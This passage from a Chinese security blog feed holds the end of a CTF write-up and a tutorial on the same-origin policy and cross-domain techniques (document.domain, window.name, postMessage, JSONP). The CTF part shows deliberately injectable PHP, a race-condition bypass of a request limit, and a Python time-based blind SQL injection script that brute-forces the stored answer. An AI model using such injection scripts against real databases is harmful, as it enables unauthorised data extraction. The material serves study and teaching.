md5(sha1(&apos;iamslowly_&apos;.mt_rand().&apos;_&apos;.mt_rand().&apos;_&apos;.mt_rand()));</span><br><span class="line">            mysqli_query($con, &quot;INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES (&apos;&#123;$new_answer&#125;&apos;,1);&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;elseif($result[&apos;count&apos;] === &apos;12&apos;)&#123;</span><br><span class="line">            mysqli_query($con, &quot;DROP TABLE `&#123;$table&#125;`;&quot;);</span><br><span class="line">            echo &apos;Game over&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $randtime = mt_rand(1, 10);</span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, &quot;SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`=&apos;&#123;$answer&#125;&apos;;&quot;)</span><br><span class="line">        );</span><br><span class="line">        if(isset($result) &amp;&amp; $result[&apos;answer&apos;] === $answer)&#123;</span><br><span class="line">            mysqli_query($con, &quot;DROP TABLE `&#123;$table&#125;`;&quot;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            mysqli_query($con, &quot;UPDATE `&#123;$table&#125;` SET `count`=`count`+1;&quot;);</span><br><span class="line">            echo &apos;Go fast&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">quit:</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>代码前面是连接MySQL数据库，并判断当前ip的信息是否存在，若不存在插入新的记录。</p>
<p>这里对<code>count</code>值进行判断，如果<code>count</code>的值等于12就把数据库中跟当前ip有关的表删除。</p>
<p><code>mysqli_query($con, &quot;SELECT * FROM</code>{$table}<code>WHERE sleep({$randtime}) OR</code>answer<code>=&#39;{$answer}&#39;;&quot;)</code></p>
<p>这里可以利用<code>answer</code>进行延迟盲注，但是如果我们请求的次数等于12时就会被删表。</p>
<p>所以我们需要绕过<code>count = 12</code>这一个判断,这里有个问题就是代码是先执行SQL语句查询，再执行<code>count++</code>。</p>
<p>所以可以在<code>count = 11</code>时加入<code>sleep(50)</code>一个比较长的延迟时间。这个时候立即再发一个请求。这个时候<code>count = 12</code>了,</p>
<p>等之前的<code>count = 11</code>的请求完成时，此时的<code>count = 13</code>了，这样就绕过了限制，可以无限的进行请求了。</p>
<p>至此我们就可以用写好的盲注脚本跑盲注了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">answer = &quot;&quot;</span><br><span class="line">for i in range(1, 33):</span><br><span class="line">    for j in &quot;abcdef1234567890&quot;:</span><br><span class="line">        url = &quot;http://iamslowly.thinkout.rf.gd/?answer=&apos; or if((answer like &apos;%s%%&apos;),sleep(30),1)%%23&quot; % (</span><br><span class="line">            answer + j)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url=url, timeout=29)</span><br><span class="line">            print(&quot;i:&quot;, i, &quot;j:&quot;, j, r.content[:10])</span><br><span class="line">        except:</span><br><span class="line">            answer += j</span><br><span class="line">            print(&quot;answer:&quot;, answer)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
<p>提交answer,得到flag.</p>
<h2><span id="reference">Reference</span></h2><p><a href="http://www.freebuf.com/articles/web/165537.html" target="_blank" rel="noopener">Solveme.peng.kr平台Web题解</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[同源策略和跨域访问学习笔记]]></title>
      <url>https://uknowsec.cn/posts/notes/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="同源策略">同源策略</span></h2><h3><span id="概述">概述</span></h3><h4><span id="含义">含义</span></h4><p>所谓同源是值三个相同</p>
<ul>
<li>协议相同</li>
<li>域名相同</li>
<li>端口相同</li>
</ul>
<h4><span id="目的">目的</span></h4><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
<p>设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？</p>
<p>很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p>
<p>由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p>
<h2><span id="跨域">跨域</span></h2><p>只要协议、域名、端口有任何一个不同，都被当作是不同的域，跨域就是访问非本域的资源。</p>
<h3><span id="跨域实现方式">跨域实现方式</span></h3><ul>
<li>document.domain</li>
<li>window.name</li>
<li>window.postMessage</li>
<li>JSONP</li>
<li>iframe</li>
<li>CORS</li>
</ul>
<h3><span id="documentdomain">document.domain</span></h3><p>Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。但是，两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置document.domain共享 Cookie。</p>
<p>举例来说，A网页是<a href="http://w1.example.com/a.html" target="_blank" rel="noopener">http://w1.example.com/a.html</a> B网页是 <a href="http://w2.example.com/b.html" target="_blank" rel="noopener">http://w2.example.com/b.html</a> 那么只要设置相同的document.domain，两个网页就可以共享Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.domain = &apos;example.com&apos;;</span><br></pre></td></tr></table></figure>
<p>现在，A网页通过脚本设置一个 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &quot;test1=hello&quot;;</span><br></pre></td></tr></table></figure>
<p>B网页就可以读到这个 Cookie。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var allCookie = document.cookie;</span><br></pre></td></tr></table></figure>
<p>注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexDB 无法通过这种方法，规避同源政策。</p>
<p>另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如.example.com。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key=value; domain=.example.com; path=/</span><br></pre></td></tr></table></figure>
<p>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。</p>
<h4><span id="实验-1-cookie-documentdomain">实验 1 cookie document.domain</span></h4><p>w1.example.com/a.html</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var cookieName = &apos;Cookie&apos;;</span><br><span class="line">	var cookieValue = &apos;Uknow&apos;;</span><br><span class="line">	var myDate = new Date();</span><br><span class="line">	myDate.setMonth(myDate.getMonth() + 12);</span><br><span class="line">	document.cookie = cookieName +&quot;=&quot; + cookieValue + &quot;;expires=&quot; + myDate </span><br><span class="line">					  + &quot;;domain=.example.com;path=/&quot;;</span><br><span class="line">	alert(document.cookie);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>w2.example.com/b.html</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.domain = &apos;example.com&apos;;</span><br><span class="line">	alert(document.cookie);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>在PHPstudy下配置虚拟主机 w1.example.com和w2.example.com，他们的html代码分别如上</p>
<p>访问 w2.example.com/b.html 看得到的cookie是否和 w1.example.com/a.html 一样</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w2-cookie.png" alt=""></p>
<p>由此可见document.domain可以实现cookie的跨域。</p>
<p>同样，两个网页不同源，就无法拿到对方的DOM。典型的例子是iframe窗口和window.open方法打开的窗口，它们与父窗口无法通信。</p>
<p>这里也可以通过document.domain来进行子域与父域之间的传值。</p>
<h4><span id="实验-2-iframe-documentdomain">实验 2 iframe document.domain</span></h4><p>父域 example.com/a.html</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.domain = &apos;example.com&apos;;</span><br><span class="line">    var ifr = document.createElement(&apos;iframe&apos;);</span><br><span class="line">    ifr.src = &apos;http://w2.example.com/b.html&apos;;</span><br><span class="line">    ifr.style.display = &apos;none&apos;;</span><br><span class="line">    document.body.appendChild(ifr);</span><br><span class="line">    ifr.onload = function()&#123;</span><br><span class="line">        var doc = ifr.contentDocument || ifr.contentWindow.document;</span><br><span class="line">        // 这里操作DOM</span><br><span class="line">        var oUl = doc.getElementById(&apos;ul1&apos;);</span><br><span class="line">        alert(oUl.innerHTML);</span><br><span class="line">        ifr.onload = null;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>子域 w2.example.com/b.html</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.domain = &apos;example.com&apos;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;ul id=&quot;ul1&quot;&gt;我是子域w2.example.com中的UL&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>这里可以看到我们在子域 w2.example.com/b.html中写了一个w2.example.com/b.html,写了一个UL标签。同时设置了 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.domain = &apos;example.com&apos;;</span><br></pre></td></tr></table></figure>
<p>然后在父域 example.com/a.html 定义一个iframe去读取子域的UL，实现异域的DOM读取。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w2-ifrome.png" alt=""></p>
<h3><span id="windowname">window.name</span></h3><p>浏览器窗口有window.name属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。</p>
<p>在w2.example.com/b.html，该网页将信息写入window.name属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.name = data;</span><br></pre></td></tr></table></figure>
<p>接着，example.com/a.html跳回一个与它同域的网址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src = &quot;http://example.com/Proxy.html</span><br></pre></td></tr></table></figure>
<p>然后在example.com/a.html 读取w2.example.com/b.html的window.name</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;iframe&quot;).contentWindow.name</span><br></pre></td></tr></table></figure>
<h4><span id="实验-3-iframe-windowname">实验 3 iframe window.name</span></h4><p>example.com/a.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;example.com/a.html&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;example.com/a.html&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function test()&#123;</span><br><span class="line">        var obj = document.getElementById(&quot;iframe&quot;);</span><br><span class="line">        obj.onload = function()&#123;</span><br><span class="line">            var message = obj.contentWindow.name;</span><br><span class="line">            alert(message);</span><br><span class="line">        &#125;</span><br><span class="line">        obj.src = &quot;http://example.com/Proxy.html&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe id=&quot;iframe&quot; src=&quot;http://w2.example.com/b.html&quot; onload=&quot;test()&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>w2.example.com/b.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;window.name&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;w2.example.com/b.html&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    //todo</span><br><span class="line">    window.name = &quot;This is message!&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>整个跨域的流程就是：</p>
<p>w2.example.com/b.html 设置了window.name = “This is message!”</p>
<p>而example.com/a.html想要获取到window.name的值就需要依靠iframe作为中间代理</p>
<p>首先把iframe的src设置成<a href="http://w2.example.com/b.html" target="_blank" rel="noopener">http://w2.example.com/b.html</a> 这样就相当于要获取iframe的window.name，</p>
<p>而要想获取到iframe中的window.name，就需要把iframe的src设置成当前域的一个页面地址”<a href="http://example.com/Proxy.html" target="_blank" rel="noopener">http://example.com/Proxy.html</a>“</p>
<p>不然根据前面讲的同源策略，window.name.html是不能访问到iframe里的window.name属性的。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w2-windowsname.png" alt=""></p>
<h3><span id="windowpostmessage">window.postMessage</span></h3><p>HTML5引入了一个全新的API：跨文档通信 API（Cross-document messaging）。</p>
<p>这个API为window对象新增了一个window.postMessage方法，允许跨窗口通信，不论这两个窗口是否同源。</p>
<p>向外界窗口发送消息<br>postMessage方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">otherWindow.postMessage(message, targetOrigin);</span><br></pre></td></tr></table></figure>
<ul>
<li><p>otherWindow:  指目标窗口，也就是给哪个window发消息。</p>
</li>
<li><p>message: 要发送的消息，类型为 String、Object (IE8、9 不支持)</p>
</li>
<li><p>targetOrigin: 是限定消息接收范围，不限制请使用 ‘*’</p>
</li>
</ul>
<p>接受信息的”message”事件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var onmessage = function (event) &#123;</span><br><span class="line">    var data = event.data;</span><br><span class="line">    var origin = event.origin;</span><br><span class="line">    //do someing</span><br><span class="line">&#125;;</span><br><span class="line">if (typeof window.addEventListener != &apos;undefined&apos;) &#123;</span><br><span class="line">    window.addEventListener(&apos;message&apos;, onmessage, false);</span><br><span class="line">&#125; else if (typeof window.attachEvent != &apos;undefined&apos;) &#123;</span><br><span class="line">    //for ie</span><br><span class="line">    window.attachEvent(&apos;onmessage&apos;, onmessage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回调函数第一个参数接收 event 对象，有三个常用属性：</p>
<ul>
<li>data:  消息</li>
<li>origin:  消息来源地址</li>
<li>source:  源 DOMWindow 对象</li>
</ul>
<h4><span id="实验-4-iframe-windowpostmessage">实验 4 iframe window.postMessage</span></h4><p>example.com/a.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;postmessage&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;example.com/a.html&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.onload = function () &#123;</span><br><span class="line">        if (typeof window.postMessage === undefined) &#123;</span><br><span class="line">            alert(&quot;浏览器不支持postMessage！&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            window.top.postMessage(&quot;Uknow&quot;, &quot;http://w2.example.com&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>w2.example.com/b.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;w2.example.com -- iframe-postmessage&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;w2.example.com/b.html&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function test()&#123;</span><br><span class="line">        if (typeof window.postMessage === undefined) &#123;</span><br><span class="line">            alert(&quot;浏览器不支持postMessage！&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            window.addEventListener(&quot;message&quot;, function(e)&#123;</span><br><span class="line">                if (e.origin == &quot;http://example.com&quot;) &#123; //只接收指定的源发来的消息</span><br><span class="line">                    alert(e.data);</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe id=&quot;iframe&quot; src=&quot;http://example.com/a.html&quot; onload=&quot;test()&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w2-mess.png" alt=""></p>
<h3><span id="jsonp">JSONP</span></h3><p>JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写。</p>
<p>JSONP实现跨域请求的原理简单的说，就是动态创建script标签，然后利用script的src 不受同源策略约束来跨域获取数据。</p>
<p>JSONP 由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。</p>
<h4><span id="实验-5-jsonp">实验 5 JSONP</span></h4><p>example.com/a.html</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;jsonp-test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        function callback_data (data) &#123;</span><br><span class="line">            console.log(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;http://w2.example.com/jsonp.php?callback=callback_data&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>w2.example.com/jsonp.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $callback = $_GET[&apos;callback&apos;];  // 获取回调函数名</span><br><span class="line">    $arr = array(&quot;name&quot; =&gt; &quot;Uknow&quot;, &quot;blog&quot; =&gt; &quot;uknowsec.cn&quot;); // 要请求的数据</span><br><span class="line">    echo $callback.&quot;(&quot;. json_encode($arr) .&quot;);&quot;; // 输出</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>w2.example.com目录下的jsonp.php文件获取数据时，地址后面跟了一个callback参数（一般的就是用callback这个参数名，你也可以用其他的参数名代替）。</p>
<p>如果你要获取数据的页面是你不能控制的，那你只能根据它所提供的接口格式进行获取。</p>
<p>因为我们的type规定是当成是一个javascript文件来引入的，所以php文件返回的应该是一个可执行的js文件。</p>
<p>访问w2.example.com/jsonp.php 控制台打印出：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w2-console.png" alt=""></p>
<p>通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，同时把我们需要的json数据作为参数传入。所以jsonp是需要服务器端和客户端相互配合的。</p>
<p>知道jsonp跨域的原理后我们就可以用js动态生成script标签来进行跨域操作了，而不用特意的手动的书写那些script标签。比如jQuery封装的方法就能很方便的来进行jsonp操作了。</p>
<p>我们在example.com中引用JQuery.js用它封装好的方法进行jsonp操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(&quot;http://w2.example.com/jsonp.php?callback=?&quot;, function(data)&#123;</span><br><span class="line">    console.log(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w2-console1.png" alt=""></p>
<p>原理是一样的，只不过我们不需要手动的插入script标签以及定义回掉函数。jQuery会自动生成一个全局函数来替换callback=?中的问号，之后获取到数据后又会自动销毁，实际上就是起一个临时代理函数的作用。</p>
<p>从请求的url和响应的数据就可以很明显的看出来了：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w2-console2.png" alt=""></p>
<p>jQuery214040478116061364444_1522324096074 就是一个临时代理函数。</p>
<p>$.getJSON方法会自动判断是否跨域，不跨域的话，就调用普通的ajax方法；跨域的话，则会以异步加载js文件的形式来调用jsonp的回调函数。</p>
<p>另外jsonp是无法post数据的，尽管jQuery.getJSON(url, [data], [callback]); 提供data参数让你可以携带数据发起请求，但这样是以get方式传递的。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//$.getJSON()方法</span><br><span class="line">$.getJSON(&quot;http://127.0.0.1:9000/jsonp.php?callback=?&quot;, &#123;u:&apos;abc&apos;, p: &apos;123&apos;&#125;, function(jsonData)&#123;</span><br><span class="line">    console.log(jsonData);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/w2-console3.png" alt=""></p>
<p>调用$.ajax()方法指定type为post，它还是会转成get方式请求</p>
